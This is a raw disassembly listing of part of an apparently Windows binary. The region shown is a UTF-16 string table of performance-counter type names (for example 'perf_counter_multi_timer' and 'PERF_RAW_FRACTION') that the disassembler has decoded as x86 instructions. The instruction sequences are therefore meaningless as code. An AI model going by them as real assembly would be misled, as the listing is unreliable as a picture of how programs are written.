  402364:	add    BYTE PTR gs:[ebx+0x0],ah
  402368:	pop    edi
  402369:	add    BYTE PTR [eax+eax*1+0x69],dh
  40236d:	add    BYTE PTR [ebp+0x0],ch
  402370:	add    BYTE PTR gs:[edx+0x0],dh
  402374:	pop    edi
  402375:	add    BYTE PTR [ecx+0x0],ch
  402378:	outs   dx,BYTE PTR ds:[esi]
  402379:	add    BYTE PTR [esi+0x0],dh
  40237c:	add    BYTE PTR [eax],al
  40237e:	add    BYTE PTR [eax],al
  402380:	push   eax
  402381:	add    BYTE PTR [ebp+0x0],al
  402384:	push   edx
  402385:	add    BYTE PTR [esi+0x0],al
  402388:	pop    edi
  402389:	add    BYTE PTR [ecx],dh
  40238b:	add    BYTE PTR [eax],dh
  40238d:	add    BYTE PTR [eax],dh
  40238f:	add    BYTE PTR [esi+0x0],cl
  402392:	push   ebx
  402393:	add    BYTE PTR [ebp+0x0],al
  402396:	inc    ebx
  402397:	add    BYTE PTR [edi+0x0],bl
  40239a:	push   esp
  40239b:	add    BYTE PTR [ecx+0x0],cl
  40239e:	dec    ebp
  40239f:	add    BYTE PTR [ebp+0x0],al
  4023a2:	push   edx
  4023a3:	add    BYTE PTR [edi+0x0],bl
  4023a6:	dec    ecx
  4023a7:	add    BYTE PTR [esi+0x0],cl
  4023aa:	push   esi
  4023ab:	add    BYTE PTR [eax],al
  4023ad:	add    BYTE PTR [eax],al
  4023af:	add    BYTE PTR [eax+0x0],dh
  4023b2:	add    BYTE PTR gs:[edx+0x0],dh
  4023b6:	data16 add BYTE PTR [edi+0x0],bl
  4023ba:	arpl   WORD PTR [eax],ax
  4023bc:	outs   dx,DWORD PTR ds:[esi]
  4023bd:	add    BYTE PTR [ebp+0x0],dh
  4023c0:	outs   dx,BYTE PTR ds:[esi]
  4023c1:	add    BYTE PTR [eax+eax*1+0x65],dh
  4023c5:	add    BYTE PTR [edx+0x0],dh
  4023c8:	pop    edi
  4023c9:	add    BYTE PTR [ebp+0x0],ch
  4023cc:	jne    0x4023ce
  4023ce:	ins    BYTE PTR es:[edi],dx
  4023cf:	add    BYTE PTR [eax+eax*1+0x69],dh
  4023d3:	add    BYTE PTR [edi+0x0],bl
  4023d6:	je     0x4023d8
  4023d8:	imul   eax,DWORD PTR [eax],0x65006d
  4023de:	jb     0x4023e0
  4023e0:	add    BYTE PTR [eax],al
  4023e2:	add    BYTE PTR [eax],al
  4023e4:	push   eax
  4023e5:	add    BYTE PTR [ebp+0x0],al
  4023e8:	push   edx
  4023e9:	add    BYTE PTR [esi+0x0],al
  4023ec:	pop    edi
  4023ed:	add    BYTE PTR [ebx+0x0],al
  4023f0:	dec    edi
  4023f1:	add    BYTE PTR [ebp+0x0],dl
  4023f4:	dec    esi
  4023f5:	add    BYTE PTR [eax+eax*1+0x45],dl
  4023f9:	add    BYTE PTR [edx+0x0],dl
  4023fc:	pop    edi
  4023fd:	add    BYTE PTR [ebp+0x0],cl
  402400:	push   ebp
  402401:	add    BYTE PTR [eax+eax*1+0x54],cl
  402405:	add    BYTE PTR [ecx+0x0],cl
  402408:	pop    edi
  402409:	add    BYTE PTR [eax+eax*1+0x49],dl
  40240d:	add    BYTE PTR [ebp+0x0],cl
  402410:	inc    ebp
  402411:	add    BYTE PTR [edx+0x0],dl
  402414:	add    BYTE PTR [eax],al
  402416:	add    BYTE PTR [eax],al
  402418:	jo     0x40241a
  40241a:	add    BYTE PTR gs:[edx+0x0],dh
  40241e:	data16 add BYTE PTR [edi+0x0],bl
  402422:	arpl   WORD PTR [eax],ax
  402424:	outs   dx,DWORD PTR ds:[esi]
  402425:	add    BYTE PTR [ebp+0x0],dh
  402428:	outs   dx,BYTE PTR ds:[esi]
  402429:	add    BYTE PTR [eax+eax*1+0x65],dh
  40242d:	add    BYTE PTR [edx+0x0],dh
  402430:	pop    edi
  402431:	add    BYTE PTR [ebp+0x0],ch
  402434:	jne    0x402436
  402436:	ins    BYTE PTR es:[edi],dx
  402437:	add    BYTE PTR [eax+eax*1+0x69],dh
  40243b:	add    BYTE PTR [edi+0x0],bl
  40243e:	je     0x402440
  402440:	imul   eax,DWORD PTR [eax],0x65006d
  402446:	jb     0x402448
  402448:	pop    edi
  402449:	add    BYTE PTR [ecx+0x0],ch
  40244c:	outs   dx,BYTE PTR ds:[esi]
  40244d:	add    BYTE PTR [esi+0x0],dh
  402450:	add    BYTE PTR [eax],al
  402452:	add    BYTE PTR [eax],al
  402454:	push   eax
  402455:	add    BYTE PTR [ebp+0x0],al
  402458:	push   edx
  402459:	add    BYTE PTR [esi+0x0],al
  40245c:	pop    edi
  40245d:	add    BYTE PTR [ebx+0x0],al
  402460:	dec    edi
  402461:	add    BYTE PTR [ebp+0x0],dl
  402464:	dec    esi
  402465:	add    BYTE PTR [eax+eax*1+0x45],dl
  402469:	add    BYTE PTR [edx+0x0],dl
  40246c:	pop    edi
  40246d:	add    BYTE PTR [ebp+0x0],cl
  402470:	push   ebp
  402471:	add    BYTE PTR [eax+eax*1+0x54],cl
  402475:	add    BYTE PTR [ecx+0x0],cl
  402478:	pop    edi
  402479:	add    BYTE PTR [eax+eax*1+0x49],dl
  40247d:	add    BYTE PTR [ebp+0x0],cl
  402480:	inc    ebp
  402481:	add    BYTE PTR [edx+0x0],dl
  402484:	pop    edi
  402485:	add    BYTE PTR [ecx+0x0],cl
  402488:	dec    esi
  402489:	add    BYTE PTR [esi+0x0],dl
  40248c:	add    BYTE PTR [eax],al
  40248e:	add    BYTE PTR [eax],al
  402490:	jo     0x402492
  402492:	add    BYTE PTR gs:[edx+0x0],dh
  402496:	data16 add BYTE PTR [edi+0x0],bl
  40249a:	arpl   WORD PTR [eax],ax
  40249c:	outs   dx,DWORD PTR ds:[esi]
  40249d:	add    BYTE PTR [ebp+0x0],dh
  4024a0:	outs   dx,BYTE PTR ds:[esi]
  4024a1:	add    BYTE PTR [eax+eax*1+0x65],dh
  4024a5:	add    BYTE PTR [edx+0x0],dh
  4024a8:	pop    edi
  4024a9:	add    BYTE PTR [ebp+0x0],ch
  4024ac:	jne    0x4024ae
  4024ae:	ins    BYTE PTR es:[edi],dx
  4024af:	add    BYTE PTR [eax+eax*1+0x69],dh
  4024b3:	add    BYTE PTR [edi+0x0],bl
  4024b6:	bound  eax,QWORD PTR [eax]
  4024b8:	popa   
  4024b9:	add    BYTE PTR [ebx+0x0],dh
  4024bc:	add    BYTE PTR gs:[eax],al
  4024bf:	add    BYTE PTR [eax+0x0],dl
  4024c2:	inc    ebp
  4024c3:	add    BYTE PTR [edx+0x0],dl
  4024c6:	inc    esi
  4024c7:	add    BYTE PTR [edi+0x0],bl
  4024ca:	inc    ebx
  4024cb:	add    BYTE PTR [edi+0x0],cl
  4024ce:	push   ebp
  4024cf:	add    BYTE PTR [esi+0x0],cl
  4024d2:	push   esp
  4024d3:	add    BYTE PTR [ebp+0x0],al
  4024d6:	push   edx
  4024d7:	add    BYTE PTR [edi+0x0],bl
  4024da:	dec    ebp
  4024db:	add    BYTE PTR [ebp+0x0],dl
  4024de:	dec    esp
  4024df:	add    BYTE PTR [eax+eax*1+0x49],dl
  4024e3:	add    BYTE PTR [edi+0x0],bl
  4024e6:	inc    edx
  4024e7:	add    BYTE PTR [ecx+0x0],al
  4024ea:	push   ebx
  4024eb:	add    BYTE PTR [ebp+0x0],al
  4024ee:	add    BYTE PTR [eax],al
  4024f0:	jo     0x4024f2
  4024f2:	add    BYTE PTR gs:[edx+0x0],dh
  4024f6:	data16 add BYTE PTR [edi+0x0],bl
  4024fa:	xor    DWORD PTR [eax],eax
  4024fc:	xor    BYTE PTR [eax],al
  4024fe:	xor    BYTE PTR [eax],al
  402500:	outs   dx,BYTE PTR ds:[esi]
  402501:	add    BYTE PTR [ebx+0x0],dh
  402504:	add    BYTE PTR gs:[ebx+0x0],ah
  402508:	pop    edi
  402509:	add    BYTE PTR [ebp+0x0],ch
  40250c:	jne    0x40250e
  40250e:	ins    BYTE PTR es:[edi],dx
  40250f:	add    BYTE PTR [eax+eax*1+0x69],dh
  402513:	add    BYTE PTR [edi+0x0],bl
  402516:	je     0x402518
  402518:	imul   eax,DWORD PTR [eax],0x65006d
  40251e:	jb     0x402520
  402520:	add    BYTE PTR [eax],al
  402522:	add    BYTE PTR [eax],al
  402524:	push   eax
  402525:	add    BYTE PTR [ebp+0x0],al
  402528:	push   edx
  402529:	add    BYTE PTR [esi+0x0],al
  40252c:	pop    edi
  40252d:	add    BYTE PTR [ecx],dh
  40252f:	add    BYTE PTR [eax],dh
  402531:	add    BYTE PTR [eax],dh
  402533:	add    BYTE PTR [esi+0x0],cl
  402536:	push   ebx
  402537:	add    BYTE PTR [ebp+0x0],al
  40253a:	inc    ebx
  40253b:	add    BYTE PTR [edi+0x0],bl
  40253e:	dec    ebp
  40253f:	add    BYTE PTR [ebp+0x0],dl
  402542:	dec    esp
  402543:	add    BYTE PTR [eax+eax*1+0x49],dl
  402547:	add    BYTE PTR [edi+0x0],bl
  40254a:	push   esp
  40254b:	add    BYTE PTR [ecx+0x0],cl
  40254e:	dec    ebp
  40254f:	add    BYTE PTR [ebp+0x0],al
  402552:	push   edx
  402553:	add    BYTE PTR [eax],al
  402555:	add    BYTE PTR [eax],al
  402557:	add    BYTE PTR [eax+0x0],dh
  40255a:	add    BYTE PTR gs:[edx+0x0],dh
  40255e:	data16 add BYTE PTR [edi+0x0],bl
  402562:	xor    DWORD PTR [eax],eax
  402564:	xor    BYTE PTR [eax],al
  402566:	xor    BYTE PTR [eax],al
  402568:	outs   dx,BYTE PTR ds:[esi]
  402569:	add    BYTE PTR [ebx+0x0],dh
  40256c:	add    BYTE PTR gs:[ebx+0x0],ah
  402570:	pop    edi
  402571:	add    BYTE PTR [ebp+0x0],ch
  402574:	jne    0x402576
  402576:	ins    BYTE PTR es:[edi],dx
  402577:	add    BYTE PTR [eax+eax*1+0x69],dh
  40257b:	add    BYTE PTR [edi+0x0],bl
  40257e:	je     0x402580
  402580:	imul   eax,DWORD PTR [eax],0x65006d
  402586:	jb     0x402588
  402588:	pop    edi
  402589:	add    BYTE PTR [ecx+0x0],ch
  40258c:	outs   dx,BYTE PTR ds:[esi]
  40258d:	add    BYTE PTR [esi+0x0],dh
  402590:	add    BYTE PTR [eax],al
  402592:	add    BYTE PTR [eax],al
  402594:	push   eax
  402595:	add    BYTE PTR [ebp+0x0],al
  402598:	push   edx
  402599:	add    BYTE PTR [esi+0x0],al
  40259c:	pop    edi
  40259d:	add    BYTE PTR [ecx],dh
  40259f:	add    BYTE PTR [eax],dh
  4025a1:	add    BYTE PTR [eax],dh
  4025a3:	add    BYTE PTR [esi+0x0],cl
  4025a6:	push   ebx
  4025a7:	add    BYTE PTR [ebp+0x0],al
  4025aa:	inc    ebx
  4025ab:	add    BYTE PTR [edi+0x0],bl
  4025ae:	dec    ebp
  4025af:	add    BYTE PTR [ebp+0x0],dl
  4025b2:	dec    esp
  4025b3:	add    BYTE PTR [eax+eax*1+0x49],dl
  4025b7:	add    BYTE PTR [edi+0x0],bl
  4025ba:	push   esp
  4025bb:	add    BYTE PTR [ecx+0x0],cl
  4025be:	dec    ebp
  4025bf:	add    BYTE PTR [ebp+0x0],al
  4025c2:	push   edx
  4025c3:	add    BYTE PTR [edi+0x0],bl
  4025c6:	dec    ecx
  4025c7:	add    BYTE PTR [esi+0x0],cl
  4025ca:	push   esi
  4025cb:	add    BYTE PTR [eax],al
  4025cd:	add    BYTE PTR [eax],al
  4025cf:	add    BYTE PTR [eax+0x0],dh
  4025d2:	add    BYTE PTR gs:[edx+0x0],dh
  4025d6:	data16 add BYTE PTR [edi+0x0],bl
  4025da:	jb     0x4025dc
  4025dc:	popa   
  4025dd:	add    BYTE PTR [edi+0x0],dh
  4025e0:	pop    edi
  4025e1:	add    BYTE PTR [esi+0x0],ah
  4025e4:	jb     0x4025e6
  4025e6:	popa   
  4025e7:	add    BYTE PTR [ebx+0x0],ah
  4025ea:	je     0x4025ec
  4025ec:	imul   eax,DWORD PTR [eax],0x6e006f
  4025f2:	add    BYTE PTR [eax],al
  4025f4:	push   eax
  4025f5:	add    BYTE PTR [ebp+0x0],al
  4025f8:	push   edx
  4025f9:	add    BYTE PTR [esi+0x0],al
  4025fc:	pop    edi
  4025fd:	add    BYTE PTR [edx+0x0],dl
  402600:	inc    ecx
  402601:	add    BYTE PTR [edi+0x0],dl
  402604:	pop    edi
  402605:	add    BYTE PTR [esi+0x0],al
  402608:	push   edx
  402609:	add    BYTE PTR [ecx+0x0],al
  40260c:	inc    ebx
  40260d:	add    BYTE PTR [eax+eax*1+0x49],dl
  402611:	add    BYTE PTR [edi+0x0],cl
  402614:	dec    esi
  402615:	add    BYTE PTR [eax],al
  402617:	add    BYTE PTR [eax+0x0],dh
  40261a:	add    BYTE PTR gs:[edx+0x0],dh
  40261e:	data16 add BYTE PTR [edi+0x0],bl
  402622:	ins    BYTE PTR es:[edi],dx
  402623:	add    BYTE PTR [ecx+0x0],ah
  402626:	jb     0x402628
  402628:	add    BYTE PTR [di+0x0],ah
  40262c:	pop    edi
  40262d:	add    BYTE PTR [edx+0x0],dh
  402630:	popa   
  402631:	add    BYTE PTR [edi+0x0],dh
  402634:	pop    edi
  402635:	add    BYTE PTR [esi+0x0],ah
  402638:	jb     0x40263a
  40263a:	popa   
  40263b:	add    BYTE PTR [ebx+0x0],ah
  40263e:	je     0x402640
  402640:	imul   eax,DWORD PTR [eax],0x6e006f
  402646:	add    BYTE PTR [eax],al
  402648:	push   eax
  402649:	add    BYTE PTR [ebp+0x0],al
  40264c:	push   edx
  40264d:	add    BYTE PTR [esi+0x0],al
  402650:	pop    edi
  402651:	add    BYTE PTR [eax+eax*1+0x41],cl
  402655:	add    BYTE PTR [edx+0x0],dl
  402658:	inc    edi
  402659:	add    BYTE PTR [ebp+0x0],al
  40265c:	pop    edi
  40265d:	add    BYTE PTR [edx+0x0],dl
  402660:	inc    ecx
  402661:	add    BYTE PTR [edi+0x0],dl
  402664:	pop    edi
  402665:	add    BYTE PTR [esi+0x0],al
  402668:	push   edx
  402669:	add    BYTE PTR [ecx+0x0],al
  40266c:	inc    ebx
  40266d:	add    BYTE PTR [eax+eax*1+0x49],dl
  402671:	add    BYTE PTR [edi+0x0],cl
  402674:	dec    esi
  402675:	add    BYTE PTR [eax],al
  402677:	add    BYTE PTR [eax+0x0],dh
  40267a:	add    BYTE PTR gs:[edx+0x0],dh
  40267e:	data16 add BYTE PTR [edi+0x0],bl
  402682:	jb     0x402684
  402684:	popa   
  402685:	add    BYTE PTR [edi+0x0],dh
  402688:	pop    edi
  402689:	add    BYTE PTR [edx+0x0],ah
  40268c:	popa   
  40268d:	add    BYTE PTR [ebx+0x0],dh
  402690:	add    BYTE PTR gs:[eax],al
  402693:	add    BYTE PTR [eax+0x0],dl
  402696:	inc    ebp
  402697:	add    BYTE PTR [edx+0x0],dl
  40269a:	inc    esi
  40269b:	add    BYTE PTR [edi+0x0],bl
  40269e:	push   edx
  40269f:	add    BYTE PTR [ecx+0x0],al
  4026a2:	push   edi
  4026a3:	add    BYTE PTR [edi+0x0],bl
  4026a6:	inc    edx
  4026a7:	add    BYTE PTR [ecx+0x0],al
  4026aa:	push   ebx
  4026ab:	add    BYTE PTR [ebp+0x0],al
  4026ae:	add    BYTE PTR [eax],al
  4026b0:	jo     0x4026b2
  4026b2:	add    BYTE PTR gs:[edx+0x0],dh
  4026b6:	data16 add BYTE PTR [edi+0x0],bl
  4026ba:	ins    BYTE PTR es:[edi],dx
  4026bb:	add    BYTE PTR [ecx+0x0],ah
  4026be:	jb     0x4026c0
  4026c0:	add    BYTE PTR [di+0x0],ah
  4026c4:	pop    edi
  4026c5:	add    BYTE PTR [edx+0x0],dh
  4026c8:	popa   
  4026c9:	add    BYTE PTR [edi+0x0],dh
  4026cc:	pop    edi
  4026cd:	add    BYTE PTR [edx+0x0],ah
  4026d0:	popa   
  4026d1:	add    BYTE PTR [ebx+0x0],dh
  4026d4:	add    BYTE PTR gs:[eax],al
  4026d7:	add    BYTE PTR [eax+0x0],dl
  4026da:	inc    ebp
  4026db:	add    BYTE PTR [edx+0x0],dl
  4026de:	inc    esi
  4026df:	add    BYTE PTR [edi+0x0],bl
  4026e2:	dec    esp
  4026e3:	add    BYTE PTR [ecx+0x0],al
  4026e6:	push   edx
  4026e7:	add    BYTE PTR [edi+0x0],al
  4026ea:	inc    ebp
  4026eb:	add    BYTE PTR [edi+0x0],bl
  4026ee:	push   edx
  4026ef:	add    BYTE PTR [ecx+0x0],al
  4026f2:	push   edi
  4026f3:	add    BYTE PTR [edi+0x0],bl
  4026f6:	inc    edx
  4026f7:	add    BYTE PTR [ecx+0x0],al
  4026fa:	push   ebx
  4026fb:	add    BYTE PTR [ebp+0x0],al
  4026fe:	add    BYTE PTR [eax],al
  402700:	jo     0x402702
  402702:	add    BYTE PTR gs:[edx+0x0],dh
  402706:	data16 add BYTE PTR [edi+0x0],bl
  40270a:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  40270f:	add    BYTE PTR [eax+0x0],dh
  402712:	jae    0x402714
  402714:	add    BYTE PTR gs:[eax+eax*1+0x5f],ah
  402719:	add    BYTE PTR [eax+eax*1+0x69],dh
  40271d:	add    BYTE PTR [ebp+0x0],ch
  402720:	add    BYTE PTR gs:[eax],al
  402723:	add    BYTE PTR [eax+0x0],dl
  402726:	inc    ebp
  402727:	add    BYTE PTR [edx+0x0],dl
  40272a:	inc    esi
  40272b:	add    BYTE PTR [edi+0x0],bl
  40272e:	inc    ebp
  40272f:	add    BYTE PTR [eax+eax*1+0x41],cl
  402733:	add    BYTE PTR [eax+0x0],dl
  402736:	push   ebx
  402737:	add    BYTE PTR [ebp+0x0],al
  40273a:	inc    esp
  40273b:	add    BYTE PTR [edi+0x0],bl
  40273e:	push   esp
  40273f:	add    BYTE PTR [ecx+0x0],cl
  402742:	dec    ebp
  402743:	add    BYTE PTR [ebp+0x0],al
  402746:	add    BYTE PTR [eax],al
  402748:	jo     0x40274a
  40274a:	add    BYTE PTR gs:[edx+0x0],dh
  40274e:	data16 add BYTE PTR [edi+0x0],bl
  402752:	arpl   WORD PTR [eax],ax
  402754:	outs   dx,DWORD PTR ds:[esi]
  402755:	add    BYTE PTR [ebp+0x0],dh
  402758:	outs   dx,BYTE PTR ds:[esi]
  402759:	add    BYTE PTR [eax+eax*1+0x65],dh
  40275d:	add    BYTE PTR [edx+0x0],dh
  402760:	pop    edi
  402761:	add    BYTE PTR [eax+eax*1+0x65],ah
  402765:	add    BYTE PTR [eax+eax*1+0x74],ch
  402769:	add    BYTE PTR [ecx+0x0],ah
  40276c:	add    BYTE PTR [eax],al
  40276e:	add    BYTE PTR [eax],al
  402770:	push   eax
  402771:	add    BYTE PTR [ebp+0x0],al
  402774:	push   edx
  402775:	add    BYTE PTR [esi+0x0],al
  402778:	pop    edi
  402779:	add    BYTE PTR [ebx+0x0],al
  40277c:	dec    edi
  40277d:	add    BYTE PTR [ebp+0x0],dl
  402780:	dec    esi
  402781:	add    BYTE PTR [eax+eax*1+0x45],dl
  402785:	add    BYTE PTR [edx+0x0],dl
  402788:	pop    edi
  402789:	add    BYTE PTR [eax+eax*1+0x45],al
  40278d:	add    BYTE PTR [eax+eax*1+0x54],cl
  402791:	add    BYTE PTR [ecx+0x0],al
  402794:	add    BYTE PTR [eax],al
  402796:	add    BYTE PTR [eax],al
  402798:	jo     0x40279a
  40279a:	add    BYTE PTR gs:[edx+0x0],dh
  40279e:	data16 add BYTE PTR [edi+0x0],bl
  4027a2:	arpl   WORD PTR [eax],ax
  4027a4:	outs   dx,DWORD PTR ds:[esi]
  4027a5:	add    BYTE PTR [ebp+0x0],dh
  4027a8:	outs   dx,BYTE PTR ds:[esi]
  4027a9:	add    BYTE PTR [eax+eax*1+0x65],dh
  4027ad:	add    BYTE PTR [edx+0x0],dh
  4027b0:	pop    edi
  4027b1:	add    BYTE PTR [eax+eax*1+0x61],ch
  4027b5:	add    BYTE PTR [edx+0x0],dh
  4027b8:	add    BYTE PTR [di+0x0],ah
  4027bc:	pop    edi
  4027bd:	add    BYTE PTR [eax+eax*1+0x65],ah
  4027c1:	add    BYTE PTR [eax+eax*1+0x74],ch
  4027c5:	add    BYTE PTR [ecx+0x0],ah
  4027c8:	add    BYTE PTR [eax],al
  4027ca:	add    BYTE PTR [eax],al
  4027cc:	push   eax
  4027cd:	add    BYTE PTR [ebp+0x0],al
  4027d0:	push   edx
  4027d1:	add    BYTE PTR [esi+0x0],al
  4027d4:	pop    edi
  4027d5:	add    BYTE PTR [ebx+0x0],al
  4027d8:	dec    edi
  4027d9:	add    BYTE PTR [ebp+0x0],dl
  4027dc:	dec    esi
  4027dd:	add    BYTE PTR [eax+eax*1+0x45],dl
  4027e1:	add    BYTE PTR [edx+0x0],dl
  4027e4:	pop    edi
  4027e5:	add    BYTE PTR [eax+eax*1+0x41],cl
  4027e9:	add    BYTE PTR [edx+0x0],dl
  4027ec:	inc    edi
  4027ed:	add    BYTE PTR [ebp+0x0],al
  4027f0:	pop    edi
  4027f1:	add    BYTE PTR [eax+eax*1+0x45],al
  4027f5:	add    BYTE PTR [eax+eax*1+0x54],cl
  4027f9:	add    BYTE PTR [ecx+0x0],al
  4027fc:	add    BYTE PTR [eax],al
  4027fe:	add    BYTE PTR [eax],al
  402800:	jo     0x402802
  402802:	add    BYTE PTR gs:[edx+0x0],dh
  402806:	data16 add BYTE PTR [edi+0x0],bl
  40280a:	jo     0x40280c
  40280c:	jb     0x40280e
  40280e:	add    BYTE PTR gs:[ebx+0x0],ah
  402812:	imul   eax,DWORD PTR [eax],0x690073
  402818:	outs   dx,DWORD PTR ds:[esi]
  402819:	add    BYTE PTR [esi+0x0],ch
  40281c:	pop    edi
  40281d:	add    BYTE PTR [ebx+0x0],dh
  402820:	jns    0x402822
  402822:	jae    0x402824
  402824:	je     0x402826
  402826:	add    BYTE PTR gs:[ebp+0x0],ch
  40282a:	pop    edi
  40282b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40282f:	add    BYTE PTR [ebp+0x0],ch
  402832:	add    BYTE PTR gs:[edx+0x0],dh
  402836:	add    BYTE PTR [eax],al
  402838:	push   eax
  402839:	add    BYTE PTR [ebp+0x0],al
  40283c:	push   edx
  40283d:	add    BYTE PTR [esi+0x0],al
  402840:	pop    edi
  402841:	add    BYTE PTR [eax+0x0],dl
  402844:	push   edx
  402845:	add    BYTE PTR [ebp+0x0],al
  402848:	inc    ebx
  402849:	add    BYTE PTR [ecx+0x0],cl
  40284c:	push   ebx
  40284d:	add    BYTE PTR [ecx+0x0],cl
  402850:	dec    edi
  402851:	add    BYTE PTR [esi+0x0],cl
  402854:	pop    edi
  402855:	add    BYTE PTR [ebx+0x0],dl
  402858:	pop    ecx
  402859:	add    BYTE PTR [ebx+0x0],dl
  40285c:	push   esp
  40285d:	add    BYTE PTR [ebp+0x0],al
  402860:	dec    ebp
  402861:	add    BYTE PTR [edi+0x0],bl
  402864:	push   esp
  402865:	add    BYTE PTR [ecx+0x0],cl
  402868:	dec    ebp
  402869:	add    BYTE PTR [ebp+0x0],al
  40286c:	push   edx
  40286d:	add    BYTE PTR [eax],al
  40286f:	add    BYTE PTR [eax+0x0],dh
  402872:	add    BYTE PTR gs:[edx+0x0],dh
  402876:	data16 add BYTE PTR [edi+0x0],bl
  40287a:	jo     0x40287c
  40287c:	jb     0x40287e
  40287e:	add    BYTE PTR gs:[ebx+0x0],ah
  402882:	imul   eax,DWORD PTR [eax],0x690073
  402888:	outs   dx,DWORD PTR ds:[esi]
  402889:	add    BYTE PTR [esi+0x0],ch
  40288c:	pop    edi
  40288d:	add    BYTE PTR [ecx],dh
  40288f:	add    BYTE PTR [eax],dh
  402891:	add    BYTE PTR [eax],dh
  402893:	add    BYTE PTR [esi+0x0],ch
  402896:	jae    0x402898
  402898:	pop    edi
  402899:	add    BYTE PTR [eax+eax*1+0x69],dh
  40289d:	add    BYTE PTR [ebp+0x0],ch
  4028a0:	add    BYTE PTR gs:[edx+0x0],dh
  4028a4:	add    BYTE PTR [eax],al
  4028a6:	add    BYTE PTR [eax],al
  4028a8:	push   eax
  4028a9:	add    BYTE PTR [ebp+0x0],al
  4028ac:	push   edx
  4028ad:	add    BYTE PTR [esi+0x0],al
  4028b0:	pop    edi
  4028b1:	add    BYTE PTR [eax+0x0],dl
  4028b4:	push   edx
  4028b5:	add    BYTE PTR [ebp+0x0],al
  4028b8:	inc    ebx
  4028b9:	add    BYTE PTR [ecx+0x0],cl
  4028bc:	push   ebx
  4028bd:	add    BYTE PTR [ecx+0x0],cl
  4028c0:	dec    edi
  4028c1:	add    BYTE PTR [esi+0x0],cl
  4028c4:	pop    edi
  4028c5:	add    BYTE PTR [ecx],dh
  4028c7:	add    BYTE PTR [eax],dh
  4028c9:	add    BYTE PTR [eax],dh
  4028cb:	add    BYTE PTR [esi+0x0],cl
  4028ce:	push   ebx
  4028cf:	add    BYTE PTR [edi+0x0],bl
  4028d2:	push   esp
  4028d3:	add    BYTE PTR [ecx+0x0],cl
  4028d6:	dec    ebp
  4028d7:	add    BYTE PTR [ebp+0x0],al
  4028da:	push   edx
  4028db:	add    BYTE PTR [eax],al
  4028dd:	add    BYTE PTR [eax],al
  4028df:	add    BYTE PTR [eax+0x0],dh
  4028e2:	add    BYTE PTR gs:[edx+0x0],dh
  4028e6:	data16 add BYTE PTR [edi+0x0],bl
  4028ea:	jo     0x4028ec
  4028ec:	jb     0x4028ee
  4028ee:	add    BYTE PTR gs:[ebx+0x0],ah
  4028f2:	imul   eax,DWORD PTR [eax],0x690073
  4028f8:	outs   dx,DWORD PTR ds:[esi]
  4028f9:	add    BYTE PTR [esi+0x0],ch
  4028fc:	pop    edi
  4028fd:	add    BYTE PTR [edi+0x0],ch
  402900:	bound  eax,QWORD PTR [eax]
  402902:	push   0x0
  402904:	add    BYTE PTR gs:[ebx+0x0],ah
  402908:	je     0x40290a
  40290a:	pop    edi
  40290b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40290f:	add    BYTE PTR [ebp+0x0],ch
  402912:	add    BYTE PTR gs:[edx+0x0],dh
  402916:	add    BYTE PTR [eax],al
  402918:	push   eax
  402919:	add    BYTE PTR [ebp+0x0],al
  40291c:	push   edx
  40291d:	add    BYTE PTR [esi+0x0],al
  402920:	pop    edi
  402921:	add    BYTE PTR [eax+0x0],dl
  402924:	push   edx
  402925:	add    BYTE PTR [ebp+0x0],al
  402928:	inc    ebx
  402929:	add    BYTE PTR [ecx+0x0],cl
  40292c:	push   ebx
  40292d:	add    BYTE PTR [ecx+0x0],cl
  402930:	dec    edi
  402931:	add    BYTE PTR [esi+0x0],cl
  402934:	pop    edi
  402935:	add    BYTE PTR [edi+0x0],cl
  402938:	inc    edx
  402939:	add    BYTE PTR [edx+0x0],cl
  40293c:	inc    ebp
  40293d:	add    BYTE PTR [ebx+0x0],al
  402940:	push   esp
  402941:	add    BYTE PTR [edi+0x0],bl
  402944:	push   esp
  402945:	add    BYTE PTR [ecx+0x0],cl
  402948:	dec    ebp
  402949:	add    BYTE PTR [ebp+0x0],al
  40294c:	push   edx
  40294d:	add    BYTE PTR [eax],al
  40294f:	add    BYTE PTR [ebx+0x0],ah
  402952:	outs   dx,DWORD PTR ds:[esi]
  402953:	add    BYTE PTR [ebp+0x0],ch
  402956:	jo     0x402958
  402958:	outs   dx,DWORD PTR ds:[esi]
  402959:	add    BYTE PTR [ebx+0x0],dh
  40295c:	imul   eax,DWORD PTR [eax],0x650074
  402962:	add    BYTE PTR [eax],al
  402964:	push   eax
  402965:	add    BYTE PTR [ebp+0x0],al
  402968:	push   edx
  402969:	add    BYTE PTR [esi+0x0],al
  40296c:	pop    edi
  40296d:	add    BYTE PTR [ebx+0x0],al
  402970:	dec    edi
  402971:	add    BYTE PTR [ebp+0x0],dl
  402974:	dec    esi
  402975:	add    BYTE PTR [eax+eax*1+0x45],dl
  402979:	add    BYTE PTR [edx+0x0],dl
  40297c:	pop    edi
  40297d:	add    BYTE PTR [ebx+0x0],al
  402980:	dec    edi
  402981:	add    BYTE PTR [ebp+0x0],cl
  402984:	push   eax
  402985:	add    BYTE PTR [edi+0x0],cl
  402988:	push   ebx
  402989:	add    BYTE PTR [ecx+0x0],cl
  40298c:	push   esp
  40298d:	add    BYTE PTR [ebp+0x0],al
  402990:	add    BYTE PTR [eax],al
  402992:	add    BYTE PTR [eax],al
  402994:	and    al,0x0
  402996:	sub    BYTE PTR [eax],al
  402998:	jae    0x40299a
  40299a:	je     0x40299c
  40299c:	jb     0x40299e
  40299e:	imul   eax,DWORD PTR [eax],0x67006e
  4029a4:	add    BYTE PTR cs:[eax],al
	...
  4029af:	add    BYTE PTR [eax-0x3fffbfe8],bh
  4029b5:	sbb    BYTE PTR [eax+0x0],al
  4029b8:	add    DWORD PTR [eax],eax
  4029ba:	add    BYTE PTR [eax],al
  4029bc:	add    BYTE PTR [eax],al
  4029be:	add    BYTE PTR [eax],al
  4029c0:	in     al,dx
  4029c1:	sbb    BYTE PTR [eax+0x0],al
  4029c4:	hlt    
  4029c5:	sbb    BYTE PTR [eax+0x0],al
  4029c8:	add    al,BYTE PTR [eax]
  4029ca:	add    BYTE PTR [eax],al
  4029cc:	add    BYTE PTR [eax],al
  4029ce:	add    BYTE PTR [eax],al
  4029d0:	sbb    al,0x19
  4029d2:	inc    eax
  4029d3:	add    BYTE PTR [ecx+ebx*1],ah
  4029d6:	inc    eax
  4029d7:	add    BYTE PTR [eax+eax*1],al
  4029da:	add    BYTE PTR [eax],al
  4029dc:	add    BYTE PTR [eax],al
  4029de:	add    BYTE PTR [eax],al
  4029e0:	dec    esp
  4029e1:	sbb    DWORD PTR [eax+0x0],eax
